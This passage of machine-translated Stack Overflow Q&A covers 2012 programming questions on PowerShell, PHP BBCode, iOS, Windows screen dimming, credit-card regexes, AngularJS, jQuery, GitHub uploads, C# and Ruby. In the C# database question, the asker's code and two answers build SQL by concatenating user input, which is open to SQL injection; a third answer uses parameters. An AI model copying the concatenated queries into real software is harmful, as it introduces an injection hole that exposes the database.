        foreach {$listbox.items.add($_.DistinguishedName)}
}

$go.Add_Click(
{
    populate -group $text.text 
}) 
```

我正在尝试获取变量`$group`并将其传递给`{cn -like "*$group*"}`但我无法让它工作。有人有什么想法吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T23:53:29.247

试试这个：

```
$pattern = "*$group*"
Get-ADGroup -filter {cn -like $pattern} ... 
```

# php - PHP无法使嵌套引号起作用

> ID：11917611
> 
> 赞同：0
> 
> 时间：2012-08-11T20:59:01.740
> 
> 标签：php, nested, bbcode, quote

我正在尝试在我的 BBcode 类中实现嵌套引号。但是还没有成功。

这是我试图实现的代码：

```
$string = '
[quote="test"]
    [quote="abc"]Test[/quote]
    test
[/quote]
Hello
';

function parseTagsRecursive($input)
{

    $regex = '#\[quote="(.*?)"]((?:[^[]|\[(?!/?quote=""])|(?R))+)\[/quote]#';

    if (is_array($input)) {
        $input = '<div style="background:#282828; padding:0; color:white;">
        <span style="display:block; background:#161616; margin-top:0; padding:5px;">' . $input[1] . ' wrote</span>
        <span style="display:block; padding:5px; font-style:italic; font-size:12px;">'. $input[2] . '</span>
    </div>';
    }

    return preg_replace_callback($regex, 'parseTagsRecursive', $input);
}

$output = parseTagsRecursive($string);

echo $output; 
```

这就是我到目前为止得到的：

```
class BBCode {

    public $str;

    function parse() {

        $this->str = preg_replace_callback(
                '#\[quote="(.*?)"]((?:[^[]|\[(?!/?quote=""])|(?R))+)\[/quote]#', 
                array($this, 'nestedQuotes'), 
                $this->str);

        return $this->str;

    }

    function nestedQuotes($input) {
        if (is_array($input)) {
            $input = '<div style="background:#282828; padding:0; color:white;">
            <span style="display:block; background:#161616; margin-top:0; padding:5px;">' . $input[1] . ' wrote</span>
            <span style="display:block; padding:5px; font-style:italic; font-size:12px;">'. $input[2] . '</span>
        </div>';
        }
        return $input;
    }

}

$string = '
[quote="test"]
    [quote="abc"]Test[/quote]
    test
[/quote]
Hello
';

$b = new BBCode();
$b->str = $string;
echo $b->parse(); 
```

我希望有人可以帮助解决这个问题。我已经搜索了很多，但没有找到任何解决问题的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:02:30.487

我认为您正在寻找[heredoc](http://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T17:47:26.343

现在可以开始工作了。

```
class BBCode {
    function parse() {
        $this->input = $this->nestedQuotes2($this->input);
    }

    function nestedQuotes2($input) {
        if (is_array($input))
            $input = '<div class="quote"><h2>' . $input[1] . ' skrev</h2><span class="txt">' . $input[2] . '</span></div>';
        return preg_replace_callback('#\[quote="(.*?)"]((?:[^[]|\[(?!/?quote=""])|(?R))+)\[/quote]#', array($this, 'nestedQuotes2'), $input);
    }
} 
```

# database-design - 是否有处理数据归档和存储的数据抓取框架？

> ID：11917613
> 
> 赞同：-1
> 
> 时间：2012-08-11T20:59:08.433
> 
> 标签：database-design, screen-scraping, web-scraping, data-mining

我做了很多网络爬虫，对于每个项目，我发现自己重写了一种框架/后端，包括将原始页面/文件保存到命名空间目录中，有时甚至是一个数据库来跟踪日期、错误消息等。

我想知道是否已经为此类任务构建了任何此类框架。我并不是指实际的抓取任务本身，它是使用诸如 Nokogiri/Mechanize/等 HTML 解析器的组合……而是用于管理抓取器及其收集的数据。对于我所做的一些任务，数据收集有几个阶段。

例如：

1.  遍历站点，下载原始页面
2.  解析存储的原始页面，提取数据
3.  清理数据（这可能涉及在第 2 阶段可能无法实现的其他外部流程）

因此，任何可以帮助我跟踪爬虫何时开始、它们是如何进行的以及它们保存原始数据的位置的系统都很棒。我曾想过使用 MongoDB 编写自己的东西，但我确信有人比我做得更好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T20:09:00.100

我知道 irobotsoft scraper 解决了所有这些问题。它有很多功能可以清理 html 页面和存储数据，内部排序和数据库操作内置在一个简单的 UI 中。

此外，它是免费的。

# iphone - 如何访问 MoreViewController 的视图并更改其标题？

> ID：11917615
> 
> 赞同：0
> 
> 时间：2012-08-11T20:59:20.300
> 
> 标签：iphone, ios, ipad

在我的应用程序中进行语言切换时，我需要在 TabBar 中访问 MoreViewController 的视图并更改它们的标题。

谁能告诉我该怎么做？

非常感谢您的帮助。

科尔斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:16:40.273

以下是一些可能对您有用的片段。请注意，以下所有内容都可能会在每个新的 iOS 版本中中断，这并不意味着要完成。

* * *

在用户编辑时自定义更多视图标题及其本身以及标题。

```
- (void)customizeTitleViewWithNavigationItem:(UINavigationItem *)navigationItem
{
    VASSERT(navigationItem != nil, @"invalid navigationItem supplied", navigationItem);
    UILabel *titleView = [[UILabel alloc] initWithFrame:CGRectZero];
    titleView.backgroundColor = [UIColor clearColor];
    titleView.font = [UIFont boldSystemFontOfSize:20.0f];
    titleView.text = navigationItem.title;
    [titleView sizeToFit];
    navigationItem.titleView = titleView;
    [titleView release];
} 
```

这需要在`UINavigationController`的委托中实现；

```
- (void)navigationController:(UINavigationController *)navigationController 
      willShowViewController:(UIViewController *)viewController 
                    animated:(BOOL)animated
{
    if (navigationController == tabBarController_.moreNavigationController)
    {
        if ([viewController isKindOfClass:NSClassFromString(@"UIMoreListController")])
        {
            [self customizeTitleViewWithNavigationItem:viewController.navigationItem];
        }
        else
        {
            NSLog(@"viewController (%@) does not seem to be a UIMoreListController", viewController);
        }
    }
    else
    {
        NSLog(@"navigationController (%@) does not seem to be the moreNavigationController", navigationController);
    }
} 
```

这需要在`UITabBarController`的委托中实现；

```
- (void)tabBarController:(UITabBarController *)controller willBeginCustomizingViewControllers:(NSArray *)viewControllers 
{
    //get the second view of the upcoming tabbar-controller
    UIView *editView = [controller.view.subviews objectAtIndex:1];
    //did we get what we expected, which is a UITabBarCustomizeView?
    if (editView != nil && [editView isKindOfClass:NSClassFromString(@"UITabBarCustomizeView")])
    {   //yes->get the navigation-view
        UIView *navigationView = [editView.subviews objectAtIndex:0];
        //is that a navigationBar?
        if (navigationView != nil && [navigationView isKindOfClass:[UINavigationBar class]])
        {   //yes->...
            UINavigationBar *navigationBar = (UINavigationBar *)navigationView;
            [self customizeTitleViewWithNavigationItem:navigationBar.topItem];
        }
        else
        {
            NSLog(@"the navigationView (%@) does not seem to be a navigationBar", navigationView);
        }
    }
    else
    {
        NSLog(@"the editView (%@) does not seem to be a UITabBarCustomizeView", editView);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T22:12:24.703

我能够使用以下代码更改我的第 6 个视图控制器（更多列表中的最后一个）的 tabBar 项目之一的标题：

```
NSArray *vcs = [(UITabBarController *)self.window.rootViewController viewControllers];
[[vcs.lastObject tabBarItem] setTitle:@"New Title"]; 
```

这是你想做的吗？

编辑后：要在第一次设置这些标题后更改它们，您需要重新设置 tabBar 控制器的 viewControllers 属性。在此代码示例中，我将第 6 个视图控制器中的一个按钮连接到一个操作方法，该方法更改了我的 3 个控制器的标题，其中 2 个在更多列表中，一个在常规列表中。

```
 -(IBAction)changeNames:(id)sender {
    UITabBarController *tbc = (UITabBarController *)[[UIApplication sharedApplication] delegate].window.rootViewController;
    NSArray *vcs = tbc.viewControllers;
    [[vcs.lastObject tabBarItem] setTitle:@"New Title"];
    [[[vcs objectAtIndex:4] tabBarItem] setTitle:@"New VC"];
    [[[vcs objectAtIndex:3] tabBarItem] setTitle:@"New VC2"];
    tbc.viewControllers = tbc.viewControllers;
} 
```

# c++ - 使用 C++ 在 Windows 上调暗屏幕

> ID：11917617
> 
> 赞同：10
> 
> 时间：2012-08-11T20:59:36.540
> 
> 标签：c++, windows, winapi, monitor, screen-brightness

我一直在研究通过我的程序在 Windows 平台上调暗屏幕。我知道有一个 SetMonitorBrightness API 允许这样做，但对我来说，问题是能够在 Windows XP 上调暗屏幕（该 API 不支持）以及在台式计算机上调暗屏幕会很好。

所以我做了一些研究，发现[这个实用程序](http://www.whitsoftdev.com/powerdimmer/)似乎在 Windows XP 桌面上使我的屏幕变暗而没有问题。我试图联系作者以了解他们如何实现调光器，但我没有收到他们的回复。

所以我很想听听这个网站上的开发人员的意见，当不支持 SetMonitorBrightness API 时，你认为他们是如何设法调暗屏幕的？

PS。我自己是一名新手开发人员，正在尝试为我们的小型企业编写节能程序。这是一个非营利组织，我们没有资金聘请 Windows 开发人员为我们做这件事。我们的大多数计算机都是 Windows XP 桌面，所以你可以看到我不能使用 SetMonitorBrightness API，因为它在网络上被广泛记录。

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T21:20:43.323

在您引用的情况下，请查看 Dependancy Walker 的屏幕保护程序。我的猜测是他们创建了一个全屏窗口并使用 SetLayeredWindowAttributes() 为窗口设置半透明设置，从而使屏幕显得暗淡。我怀疑它会为你节省很多钱。

您可能想查看[DDC 协议](http://en.wikipedia.org/wiki/Display_Data_Channel)，该协议允许您控制某些监视器的各个方面。可以在此处找到允许您执行此操作的 MS API：http: [//msdn.microsoft.com/en-us/library/windows/hardware/ff570290%28v=vs.85%29.aspx](http://msdn.microsoft.com/en-us/library/windows/hardware/ff570290%28v=vs.85%29.aspx)，您应该看看在 I2C 功能上也是如此。

或者，您可以寻找一个现成的库来为您完成 DDC 工作，例如[http://www.nicomsoft.com/products/i2c/](http://www.nicomsoft.com/products/i2c/)。他们也有一个调光器应用程序，个人使用免费，商业使用非免费。如果您联系他们并解释它是为非营利组织服务的，他们甚至可能允许您免费使用它。

如果您尝试将此作为节能程序，为什么不使用屏幕保护程序设置，在一段时间空闲后关闭显示器？任何状况之下

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-11T21:09:19.413

如果此信息已过时，请原谅我，但我过去曾使用 SetDeviceGammaRamp 完成此操作。“获取”版本也可用于状态保存和恢复。我已经看到它在 C# 程序中使用过，所以它可能仍然是相关的，尽管不再太常见了。

# javascript - Javascript中的信用卡预测

> ID：11917625
> 
> 赞同：5
> 
> 时间：2012-08-11T21:01:18.420
> 
> 标签：javascript, jquery, credit-card

我正在编写一个工具，onkeydown 将运行在输入框中输入的当前值，以检查它是否与 4 种主要信用卡类型之一的正则表达式匹配。

我觉得它有点工作，但它是片状的，所以我想弄清楚是什么导致它给出错误的响应（例如，有时它会输出 2 个值而不是一个）。是因为我需要在循环之前设置一个标志变量吗？在匹配正确的卡片后，我只是从循环中返回对象，所以我认为这就足够了......

正则表达式的标准来自[该站点](http://www.regular-expressions.info/creditcard.html)：

*   **Visa** :`^4[0-9]{12}(?:[0-9]{3})?$`所有 Visa 卡号均以 4 开头。新卡有 16 位数字。老牌有13张。

*   **万事达卡**：`^5[1-5][0-9]{14}$`所有万事达卡号码都以数字 51 到 55 开头。所有号码都有 16 位数字。

*   **美国运通**：`^3[47][0-9]{13}$`美国运通卡号以 34 或 37 开头，有 15 位数字。

*   **Discover**：`^6(?:011|5[0-9]{2})[0-9]{12}$`Discover 卡号以 6011 或 65 开头，均为 16 位数字。

    ```
    $(function() {

    var $cardNumber = $('#js-cardnumber');

    var ccMap = {};

    ccMap.cards = {
        'amex': '^3[47][0-9]{13}$',
        'discover': '^6(?:011|5[0-9]{2})[0-9]{12}$',
        'mastercard': '^5[1-5][0-9]{14}$',
        'visa': '^4[0-9]{12}(?:[0-9]{3})?$'
    };

    $cardNumber.keydown(function() {
    for (var cardType in ccMap.cards) {
        if (ccMap.cards.hasOwnProperty(cardType)) {
            var regex = ccMap.cards[cardType];
            if (regex.match($(this).val())) {
                console.log(cardType);
                return;
            }
        }
    }
    });
    });​ 
    ```

[这是一个小提琴](http://jsfiddle.net/someprimetime/ThzXG/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T21:12:46.000

似乎您以错误的方式使用正则表达式。

如果要根据正则表达式检查字符串，可以使用`match()`字符串的方法：

```
string.match(regexp) // returns boolean 
```

你这样做是错误的方式：

```
if ( regex.match($(this).val()) ) { 
```

尝试将当前值解释为正则表达式。必须是这样的：

```
if ( $(this).val().match(regex) ) { 
```

* * *

您还可以缓存正则表达式以使您的脚本更高效：

```
ccMap.cards = {
    'amex': /^3[47][0-9]{13}$/,  // store an actual regexp object, not a string
    // ...

// The way you test changes, now you're able to use the "test"
// method of the regexp object:
if ( regex.test($(this).val()) ) { 
```

# angularjs - AngularJS 在不打印到屏幕的情况下评估插值表达式

> ID：11917628
> 
> 赞同：0
> 
> 时间：2012-08-11T21:01:54.793
> 
> 标签：angularjs

我有一个昂贵的函数调用，每个循环调用一次，但我想将它的返回值设置为可以直接在循环中使用的临时变量。

这通过设置起作用`{{ val=fn(...) }}`，但它也打印到​​屏幕上。是否可以在不打印值的情况下执行此操作？

我试过使用一组花括号`{}`，但它不起作用。

关于如何做到这一点的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:07:42.800

您是否查看过“过滤器”或可能在您的 JS 代码中而不是视图中进行工作？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T22:53:58.707

在需要值时调用方法而不是临时变量，并在此方法中使用结果的缓存版本，或者如果缓存版本为空/未定义，则调用昂贵的方法。每次迭代它只会调用一次昂贵的函数，如果不需要它就不会调用它。除非您愿意，否则它不会打印。因为 ng-repeat 的每次迭代都会产生一个新范围，所以每次迭代都将从一个空缓存开始。

例如：

```
$scope.cache = null
$scope.getValue = function() {
  if (!this.cache) { // use typeof if 0 or false or empty string is valid!
    this.cache = myExpensiveFunc()
  }
  return this.cache
} 
```

不是 100% 肯定 $scope.cache = null 将为迭代的每个范围初始化，您可能需要检查 getValue 中是否有 'this' hasOwnProperty 'cache'。因此，在您看来，只有在需要时才引用 getValue()。

！

编辑：缓存在范围内，而不是在控制器中。

# jquery - 将淡入淡出切换到上滑

> ID：11917632
> 
> 赞同：1
> 
> 时间：2012-08-11T21:02:19.100
> 
> 标签：jquery

在下面的代码中，我试图让 div 在悬停时向上滑动到位，然后在鼠标离开后淡出。最简单的方法是什么？

```
$(window).load(function(){  
        $('div.description').each(function(){  
        $(this).css('opacity', 0);  
        $(this).css('width', $(this).siblings('img').width());  
        $(this).parent().css('width', $(this).siblings('img').width());  
        $(this).css('display', 'block');  
    });  

    $('div.wrapper').hover(function(){    
        $(this).children('.description').stop().fadeTo(700, 0.8);  
    },function(){  
        $(this).children('.description').stop().fadeTo(700, 0);  
    });  

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:28:00.270

```
$('div.wrapper').mouseenter(function(){    
    $(this).children('.description').stop().fadeTo(700, 0.8);  
}).mouseleave(function(){  
    $(this).children('.description').stop().slideUp(700);  
}); 
```

相当简单。不能保证代码会起作用，但它有正确的想法。您应该使用 mouseenter 和 mouseleave，因为它不会在您每次更改包装器 div 中的元素时触发。它会跟踪鼠标何时进入 div 的范围，然后很好地离开它们。

我不记得这是否会成为一个问题，但我相信不会。如果你的 div 是`height:0`after`slideUp()`你可能必须`slideDown(0)`then `hide()`before `fadeTo()`。

# ios - iOS 内存管理 - 内存不足警告和 viewDidUnload

> ID：11917642
> 
> 赞同：0
> 
> 时间：2012-08-11T21:04:30.907
> 
> 标签：ios, memory-management, viewdidunload

当我收到内存警告时出现此错误：

```
*** -[TheViewController_iPhone productImages]: message sent to deallocated instance 
```

Xcode 显示错误位于以下行：

```
- (void)viewDidUnload
{
    [super viewDidUnload];

    [self.productTimer invalidate];
    //self.productTimer = nil;

    for(UIView *subview in [self.productImages subviews]) { //THIS LINE IS THE ERROR
        [subview removeFromSuperview];
    }
} 
```

所以我的问题是，为什么此时会释放 productImages（它是一个滚动视图）？我不应该有机会转储它的子视图吗？

它是这样定义的：

```
@property (weak, nonatomic) IBOutlet UIScrollView *productImages; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:43:47.930

`viewDidUnload`您的视图控制器的视图在被调用时已经被卸载。这意味着视图的任何子视图将不再被视图保留。我假设这`productImages`是视图控制器视图的子视图。在这种情况下，您必须声明`productImages`as`strong`而不是`weak`如果您希望它在视图被卸载后仍然可用。

另一个注意事项是，开始重复计时器以`viewDidLoad`使它们无效是非常糟糕的做法`viewDidUnload`。`viewDidAppear:`在和中执行此操作要好得多`viewWillDisappear:`。有关详细说明，请参阅此博客文章[http://antonholmquist.com/blog/why-you-really-shouldnt-create-repeating-nstimers-in-init-or-viewdidload/](http://antonholmquist.com/blog/why-you-really-shouldnt-create-repeating-nstimers-in-init-or-viewdidload/)

# git - 如何以编程方式将文件上传到 github 存储库的下载区域？

> ID：11917646
> 
> 赞同：4
> 
> 时间：2012-08-11T21:04:45.373
> 
> 标签：git, ant, github

我有一个创建文件（zip、jar 等）的 ANT 版本。我希望将这些文件推送到我的 github 存储库的“下载”区域，或者通过 ANT 提供给我的任务（我试过 scp 无济于事），通过 Jenkins（我试过“通过 SSH 发布”，但无济于事) 或其他方式。

谢谢指导。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-12T00:02:41.803

这意味着使用**[GitHub V3 API](http://developer.github.com/v3/repos/downloads/)**来：

*   在您的 GitHub 存储库下载页面上[创建一个下载条目](http://developer.github.com/v3/repos/downloads/#create-a-new-download-part-1-create-the-resource)
*   [将文件上传到 S3](http://developer.github.com/v3/repos/downloads/#create-a-new-download-part-2-upload-file-to-s3)

将这些 ruby​​ 脚本视为如何使用此 API 的实际示例：
“ [`lib/octokit/client/downloads.rb`](https://github.com/pengwynn/octokit/pull/97/files)”。

但是，如果您需要从 ant 执行此操作，则可以考虑[ant-contrib 的 HTTP-Post 任务](http://ant-contrib.sourceforge.net/tasks/tasks/post_task.html)。
或者让你的 ant 脚本调用诸如“ [HTTPie: cURL for Humans](https://github.com/jkbr/httpie/) ”之类的命令，
或者直接使用 Jenkins，如“[通过 HTTP Post-Commit Hook 将 Github 连接到安全的 Jenkins](https://stackoverflow.com/questions/6957219/connect-github-to-secured-jenkins-via-http-post-commit-hook) ”

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:18:30.490

您需要一个自定义步骤来编写 curl 脚本。

# c# - 尽管进行了 TextBox 验证，数据仍会被添加

> ID：11917647
> 
> 赞同：0
> 
> 时间：2012-08-11T21:04:52.670
> 
> 标签：c#, c#-4.0

好吧，我有一个简单的程序正在写入数据库。我正在尝试像这样向文本框添加验证，

```
private void textBox1_TextChanged(object sender, EventArgs e)
{
    try
    {
         if (textBox1.Text.Length < -1)
         {
             MessageBox.Show("Don't Leave this field blank!");
         }
    }
    catch
    {
         //todo
    }
} 
```

和我保存到数据库代码，

```
private void button1_Click(object sender, EventArgs e)
{
    SqlConnection con = new SqlConnection("Server = DAFFODILS-PC\\SQLEXPRESS;Database=Library;Trusted_Connection=True;");
    SqlCommand sql1 = new SqlCommand("INSERT into Book VALUES('" + textBox1.Text + "' , '" + textBox2.Text + "','" + dateTimePicker1.Value.ToShortDateString() + "')", con);
     con.Open();
     sql1.ExecuteNonQuery();
     con.Close();
     this.bookTableAdapter.Fill(this.booksDataSet.Book);
     MessageBox.Show("Data Added!");
     this.Close();    
} 
```

但它仍然在向数据库中添加空白数据，奇怪的是在数据库中我不允许为空，但仍在添加数据。任何线索我错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:15:01.397

我没有看到您停止数据库以添加空内容。您正在验证 textbox_textchanged 事件，该事件只会在有人输入数据时验证文本。您需要对 button1 的单击事件进行验证，如下所示：

```
 private void button1_Click(object sender, EventArgs e)
    {
        if(string.IsNullOrEmpty(textBox1.Text.Trim()))
        {
            MessageBox.Show("Null String !!!!!!!!");
            return;
        }
        SqlConnection con = new SqlConnection("Server = DAFFODILS-PC\\SQLEXPRESS;Database=Library;Trusted_Connection=True;");
        SqlCommand sql1 = new SqlCommand("INSERT into Book VALUES('" + textBox1.Text + "' , '" + textBox2.Text + "','" + dateTimePicker1.Value.ToShortDateString() + "')", con);
        con.Open();
        sql1.ExecuteNonQuery();
        con.Close();
        this.bookTableAdapter.Fill(this.booksDataSet.Book);
        MessageBox.Show("Data Added!");
        this.Close();

    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T21:08:18.467

一个空的 textbox.Text 的字节长度为零，而不是 -1。
为确保文本框不为空，您应该将 Trim() 应用于当前文本
此外，无需在此代码上捕获异常。

此外，不要使用 TextChanged 事件来验证文本框。为此目的有验证事件。（记得为控件设置 CauseValidation=True）

```
private void textBox1_Validating(object sender, CancelEventArgs e)
{
        if (textBox1.Text.Trim().Length == 0) 
        { 
            MessageBox.Show("Don't Leave this field blank!"); 
             e.Cancel = true; 
        } 
} 
```

当然，您可以将代码中的所有验证移到您更新数据库的位置

```
private void button1_Click(object sender, EventArgs e)      
{   
    if (textBox1.Text.Trim().Length == 0) 
    { 
        MessageBox.Show("Don't Leave this field blank!"); 
        return;
    } 

    using(SqlConnection con = new SqlConnection(
          "Server=DAFFODILS-PC\\SQLEXPRESS;Database=Library;Trusted_Connection=True;");      
    {
        SqlCommand sql1 = new SqlCommand("INSERT into Book " + 
                           "VALUES(@text1, @text2,@dtValue", con);      
        sql1.Parameters.AddWithValue("@text1", textBox1.Text);
        sql1.Parameters.AddWithValue("@text2", textBox2.Text);
        sql1.Parameters.AddWithValue("@dtValue", dateTimePicker1.Value.ToShortDateString());
        con.Open();      
        sql1.ExecuteNonQuery();      
        this.bookTableAdapter.Fill(this.booksDataSet.Book);      
        MessageBox.Show("Data Added!");      
        this.Close();      

    }      
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T21:28:13.977

```
private void button1_Click(object sender, EventArgs e)
{
    if(string.IsNullOrEmpty(textBox1.Text) || textBox1.Text.Trim().Length == 0)
    {
        //log
        return;
    }

    SqlConnection con = new SqlConnection("Server = DAFFODILS-PC\\SQLEXPRESS;Database=Library;Trusted_Connection=True;");
    SqlCommand sql1 = new SqlCommand("INSERT into Book VALUES('" + textBox1.Text + "' , '" + textBox2.Text + "','" + dateTimePicker1.Value.ToShortDateString() + "')", con);
    con.Open();
    sql1.ExecuteNonQuery();
    con.Close();
    this.bookTableAdapter.Fill(this.booksDataSet.Book);
    MessageBox.Show("Data Added!");
    this.Close();
} 
```

# c# - C# 格式化类方法的输出，现在不显示任何数据

> ID：11917648
> 
> 赞同：1
> 
> 时间：2012-08-11T21:05:04.103
> 
> 标签：c#, string, methods, formatting

所以我想格式化这个文本，让它被填充，而且很好，很方正，不依赖于不同地址大小或名称的长度。但是，现在它采用这种格式......关于实际变量和值没有任何显示。

在我做之前

```
 Console.WriteLine(emp[i].GetEmpName()); 
```

它工作正常，它显示了存储在该方法中的字符串。现在我不确定断开连接在哪里，但它现在显示一个空白值，例如

```
Employee Name:
EmployeeAddress: 
```

等等。

```
for (int i = 0; i < count; i++)
        {
            string eNum = "Employee Number: ";
            string eName = "Emplyee Name: ";
            string eAddress = "Employee Address: ";

            Console.WriteLine("------------------------------------------------------------------------");
            Console.Write("|");
            Console.Write(eNum.PadRight(30), emp[i].GetEmpNum());
            Console.Write("|\n");

            Console.Write("|");
            Console.Write(eName.PadRight(30), emp[i].GetEmpName());
            Console.Write("|\n");

            Console.Write("|");
            Console.Write(eAddress.PadRight(30), emp[i].GetEmpAddress());
            Console.Write("|\n");
            //Console.Write();
            //Console.Write();
            Console.Write("|");
            Console.Write("Net Pay: {0:f2}", emp[i].CalcSalary());
            Console.WriteLine("\n------------------------------------------------------ ------------------\n\n");
        } 
```

如果您想查看其余代码，请在此处查看。只要您不格式化输出，它就可以再次工作。

我哪里错得这么严重？！？！

```
using System;
using System.IO;

namespace Proj10
{
class Program
{
    const int ARRAY_TWO = 2;

    static void Main()
    {
        int count = 0;

        Employee[] emp = new Employee[10];

        string environment = System.Environment.GetFolderPath
        (System.Environment.SpecialFolder.Personal) + "\\";

        Console.WriteLine("Enter a file name in My Documents: ");
        string input = Console.ReadLine();

        string path = environment + input;

        StreamReader myFile = new StreamReader(path);

        do
        {

            if (myFile.EndOfStream)
            {
                break;
            }
            int num = int.Parse(myFile.ReadLine());
            string name = myFile.ReadLine();
            string address = myFile.ReadLine();
            string hourNworked = myFile.ReadLine();
            double[] values = new double[ARRAY_TWO];
            sort(hourNworked, ref values);

            emp[count] = new Employee();
            emp[count].SetEmpNum(num);
            emp[count].SetEmpName(name);
            emp[count].SetEmpAddress(address);
            emp[count].SetEmpHrlyPay(values[0]);
            emp[count].SetEmpHrsWrked(values[1]);

            //while count < 10 && !myfile.EOF();

            //print loop using count 
            //emp[0].GetEmpNum();
            //emp[0].CalcSalary();

            /*Integer[] number = new Integer[5];
            for (int i = 0; i < 5; i++)
                number[i] = new Integer(i);
            for (int i = 0; i < 5; i++)
                Console.WriteLine(number[i].GetValue());
            */

            count++;

        } while (count < 10);

        Console.WriteLine("\n\nAuthor: Daniel Demers");
        Console.WriteLine("CS 1400 X01\n");

        for (int i = 0; i < count; i++)
        {
            string eNum = "Employee Number: ";
            string eName = "Emplyee Name: ";
            string eAddress = "Employee Address: ";

            Console.WriteLine("------------------------------------------------------------------------");
            Console.Write("|");
            Console.Write(eNum.PadRight(30), emp[i].GetEmpNum());
            Console.Write("|\n");

            Console.Write("|");
            Console.Write(eName.PadRight(30), emp[i].GetEmpName());
            Console.Write("|\n");

            Console.Write("|");
            Console.Write(eAddress.PadRight(30), emp[i].GetEmpAddress());
            Console.Write("|\n");
            //Console.Write();
            //Console.Write();
            Console.Write("|");
            Console.Write("Net Pay: {0:f2}", emp[i].CalcSalary());
            Console.WriteLine("\n------------------------------------------------------------------------\n\n");
        }

        Console.ReadLine();
    }

    public static void sort(string hourNworked, ref double[] values)
    {
        char[] rules = { ' ' };
        string[] splitArray = hourNworked.Split(rules);
        values[0] = double.Parse(splitArray[0]);
        values[1] = double.Parse(splitArray[1]);
    }

    public class Employee
    {
        private int empNum;
        private string name;
        private string address;
        private double hrlyPay;
        private double hrsWrkd;
        private double GROSS;
        private double overTime;
        private double overTimePay;
        private double overTimeHours;
        private double NET;
        private double regTime;
        private double fTaxAmount;
        private double sTaxAmount;

        private const double FED_TAX = .20;
        private const double STATE_TAX = .075;
        private const double OT_MULTIPLYER = 1.5;
        private const int FORTY_HOURS = 40;

        public Employee()
        {
            empNum = 0;
        }

        public void SetEmpNum(int n)
        {
            empNum = n;
        }

        public int GetEmpNum()
        {
            return empNum;
        }
        public void SetEmpName(string n)
        {
            name = n;
        }
        public string GetEmpName()
        {
            return name;
        }
        public void SetEmpAddress(string a)
        {
            address = a;
        }
        public string GetEmpAddress()
        {
            return address;
        }
        public void SetEmpHrlyPay(double h)
        {
            hrlyPay = h;
        }
        public double GetEmpHrlyPay()
        {
            return hrlyPay;
        }
        public void SetEmpHrsWrked(double w)
        {
            hrsWrkd = w;
        }
        public double GetEmpHrsWrkd()
        {
            return hrsWrkd;
        }
        public double CalcSalary()
        {
            if (hrsWrkd > 40)
            {
                overTimeHours = hrsWrkd - FORTY_HOURS;
                overTimePay = hrlyPay * OT_MULTIPLYER;
                overTime = overTimePay * overTimeHours;
                regTime = (hrsWrkd - overTimeHours) * hrlyPay;
                GROSS = overTime + regTime;

                fTaxAmount = (regTime + overTime) * FED_TAX;
                sTaxAmount = (regTime + overTime) * STATE_TAX;

                NET = GROSS - (fTaxAmount + sTaxAmount);

                return NET;
            }
            else
            {
                regTime = hrlyPay * hrsWrkd;
                fTaxAmount = regTime * FED_TAX;
                sTaxAmount = regTime * STATE_TAX;

                NET = regTime - (fTaxAmount + sTaxAmount);

                return NET;
            }
        }
    }
}
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T21:10:23.563

您正在使用的[`Console.Write`重载](http://msdn.microsoft.com/en-us/library/9xdyw6yk.aspx)需要一个格式字符串和一个对象。由于您的第一个参数不包含任何占位符，因此不使用第二个参数。

试试这个：

```
Console.WriteLine("|{0,-30}{1,-20}|", eNum, emp[i].GetEmpNum()); 
```

在线查看它：[ideone](http://ideone.com/rERJO)

# ruby - 从另一个类访问模块配置常量

> ID：11917650
> 
> 赞同：0
> 
> 时间：2012-08-11T21:05:22.573
> 
> 标签：ruby, configuration, gem, require

我试图了解以下代码如何做到这一点：

```
attr_accessor *Configuration::VALID_CONFIG_KEYS 
```

无需配置文件。以下是部分代码：

```
require 'openamplify/analysis/context'
require 'openamplify/connection'
require 'openamplify/request'

module OpenAmplify
  # Provides access to the OpenAmplify API http://portaltnx20.openamplify.com/AmplifyWeb_v20/
  #
  # Basic usage of the library is to call supported methods via the Client class.
  #
  #   text = "After getting the MX1000 laser mouse and the Z-5500 speakers i fell in love with logitech"
  #   OpenAmplify::Client.new.amplify(text)

  class Client
    include OpenAmplify::Connection
    include OpenAmplify::Request

    attr_accessor *Configuration::VALID_CONFIG_KEYS

    def initialize(options={})
      merged_options = OpenAmplify.options.merge(options)
      Configuration::VALID_CONFIG_KEYS.each do |key|
        send("#{key}=", merged_options[key])
      end
    end
  ....
  end 
```

这是配置模块：

```
require 'openamplify/version'

# TODO: output_format, analysis, scoring can be specied in the client and becomes the default unless overriden

module OpenAmplify
  # Defines constants and methods for configuring a client
  module Configuration
    VALID_CONNECTION_KEYS = [:endpoint, :user_agent, :method, :adapter].freeze
    VALID_OPTIONS_KEYS    = [:api_key, :analysis, :output_format, :scoring].freeze

    VALID_CONFIG_KEYS     = VALID_CONNECTION_KEYS + VALID_OPTIONS_KEYS

    DEFAULT_ENDPOINT      = 'http://portaltnx20.openamplify.com/AmplifyWeb_v21/AmplifyThis'
    DEFAULT_HTTP_METHOD   = :get
    DEFAULT_HTTP_ADAPTER  = :net_http
    DEFAULT_USER_AGENT    = "OpenAmplify Ruby Gem #{OpenAmplify::VERSION}".freeze

    DEFAULT_API_KEY       = nil
